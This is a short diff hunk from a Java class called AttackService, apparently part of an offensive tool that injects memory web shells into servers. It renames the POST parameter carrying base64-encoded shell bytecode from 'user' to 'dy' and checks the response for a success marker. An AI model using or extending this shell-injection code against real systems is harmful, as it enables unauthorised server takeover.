@@ -420,7 +420,7 @@ public class AttackService {
 
             try {
                 String b64Bytecode = MemBytes.getBytes(memShellType);
-                String postString = "user=" + b64Bytecode;
+                String postString = "dy=" + b64Bytecode;
                 String result = this.bodyHttpRequest(header, postString);
                 if (result.contains("->|Success|<-")) {
                     String httpAddress = Utils.UrlToDomain(this.url);
